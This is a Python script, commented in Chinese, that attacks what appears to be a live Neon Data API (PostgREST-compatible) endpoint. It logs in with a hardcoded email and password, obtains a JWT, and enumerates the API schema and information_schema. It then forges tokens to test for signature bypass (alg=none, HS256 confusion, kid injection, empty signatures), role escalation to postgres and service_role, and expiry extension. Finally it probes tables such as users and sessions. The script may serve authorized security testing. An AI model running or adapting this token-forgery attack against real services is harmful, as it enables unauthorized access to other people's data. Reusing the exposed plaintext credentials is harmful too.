# -*- coding: utf-8 -*-
"""Data API 框架面(PostgREST 兼容层):
1. 登录 -> /token 拿 Data API JWT
2. 带 JWT 访问 OpenAPI 根(表/RPC 枚举泄露?)
3. JWT 篡改矩阵(alg=none/role/kid/exp) —— 网关 JWT 校验行为
4. PostgREST 特性端点(带 JWT)"""
import http.client, ssl, json, time, urllib.parse, base64

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
AP = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
DB = 'neondb'

def req(host, method, path, body=None, hdr=None):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
        if hdr:
            h.update(hdr)
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace('+', '-').replace('/', '_').rstrip('=')

def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')

print('=== [1] na2 登录(cookie) + GET /token ===', flush=True)
st, raw, hdrs1 = req(NA, 'POST', '/%s/auth/sign-in/email' % DB,
                     {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                     {'Origin': 'http://localhost:3000'})
print('sign-in:', st, raw[:150].replace('\n', ' '), flush=True)
sc = hdrs1.get('set-cookie') or hdrs1.get('set-cookie', '')
cookies = {}
for part in sc.split(','):
    kv = part.strip().split(';')[0]
    if '=' in kv:
        k, v = kv.split('=', 1)
        cookies[k.strip()] = v.strip()
print('set-cookie keys:', list(cookies.keys()), flush=True)
ck = '; '.join('%s=%s' % (k, v) for k, v in cookies.items())
# 若登录未回 cookie,用 body token 兜底
if not ck:
    try:
        d = json.loads(raw)
        ck = 'better-auth.session_token=' + (d.get('token') or '')
    except Exception:
        pass
jwt = ''
if ck:
    st2, raw2, _ = req(NA, 'GET', '/%s/auth/token' % DB, hdr={'Cookie': ck})
    print('/token GET+cookie:', st2, raw2[:200].replace('\n', ' '), flush=True)
    if st2 == 200:
        try:
            jwt = json.loads(raw2).get('token', '')
            print('jwt len:', len(jwt), flush=True)
            pp = json.loads(dec(jwt.split('.')[1]))
            print('  jwt payload:', json.dumps(pp, ensure_ascii=False))
            hh = json.loads(dec(jwt.split('.')[0]))
            print('  jwt header:', json.dumps(hh))
        except Exception as e:
            print('  parse err', e, flush=True)

if not jwt:
    print('NO JWT, abort'); raise SystemExit

print('\n=== [2] OpenAPI/根 带 JWT ===', flush=True)
for p in ['/%s/rest/v1/' % DB, '/%s/rest/v1' % DB, '/%s/rest/v1/rpc/' % DB,
          '/%s/rest/v1/openapi.json' % DB, '/%s/rest/v1/information_schema.tables' % DB]:
    st3, raw3, hdrs3 = req(AP, 'GET', p, hdr={'Authorization': 'Bearer ' + jwt})
    ct = hdrs3.get('content-type', '')[:35]
    print('[%s] -> %d CT=%s %s' % (p[:50], st3, ct, raw3[:300].replace('\n', ' ')), flush=True)
    if st3 == 200 and 'json' in ct:
        try:
            j = json.loads(raw3)
            if isinstance(j, dict) and 'paths' in j:
                print('  !! OpenAPI paths count:', len(j['paths']))
                names = sorted(j['paths'].keys())
                print('  paths sample:', names[:40])
            elif isinstance(j, list):
                print('  list len:', len(j), 'sample:', str(j[:3])[:200])
        except Exception:
            pass
    time.sleep(0.3)

print('\n=== [3] JWT 篡改矩阵 ===', flush=True)
def mk_jwt(h, p, sig='x'):
    return b64u(json.dumps(h, separators=(',', ':'))) + '.' + b64u(json.dumps(p, separators=(',', ':'))) + '.' + (sig or '')
h0 = json.loads(dec(jwt.split('.')[0]))
p0 = json.loads(dec(jwt.split('.')[1]))
tests = []
# alg=none
tests.append(('alg=none', mk_jwt({'alg': 'none', 'typ': 'JWT'}, p0, '')))
# alg=none 变体
tests.append(('alg=none+empty', mk_jwt({'alg': 'none'}, p0, 'e30')))
# HS256(用公钥作 key 的混淆尝试需要公钥——先看 401 行为)
tests.append(('alg=HS256+rand', mk_jwt({'alg': 'HS256'}, p0, 'AAAA')))
# kid 注入
tests.append(('kid=x', mk_jwt({'alg': 'RS256', 'kid': 'x', 'typ': 'JWT'}, p0, 'AAAA')))
# role claim 提升
p_r = dict(p0)
for rl in ['postgres', 'neon_superuser', 'authenticated', 'service_role', 'owner']:
    p_r['role'] = rl
    tests.append(('role=%s' % rl, mk_jwt(h0, p_r)))
# exp 未来
p_e = dict(p0)
p_e['exp'] = p_e.get('exp', 0) + 999999999
tests.append(('exp+future', mk_jwt(h0, p_e)))
# 空签名
tests.append(('empty-sig', mk_jwt(h0, p0, '')))
for name, tj in tests:
    st4, raw4, _ = req(AP, 'GET', '/%s/rest/v1/' % DB, hdr={'Authorization': 'Bearer ' + tj})
    print('[%s] -> %d %s' % (name, st4, raw4[:130].replace('\n', ' ')), flush=True)
    time.sleep(0.25)

print('\n=== [4] PostgREST 特性头(真实 JWT) ===', flush=True)
# 已知表探测:找 Data API 可读表(用 OpenAPI 路径或猜)
for tbl in ['todos', 'users', 'sessions', 'accounts']:
    st5, raw5, _ = req(AP, 'GET', '/%s/rest/v1/%s?select=*&limit=1' % (DB, tbl), hdr={'Authorization': 'Bearer ' + jwt})
    print('[tbl %s] -> %d %s' % (tbl, st5, raw5[:100].replace('\n', ' ')), flush=True)
    time.sleep(0.2)
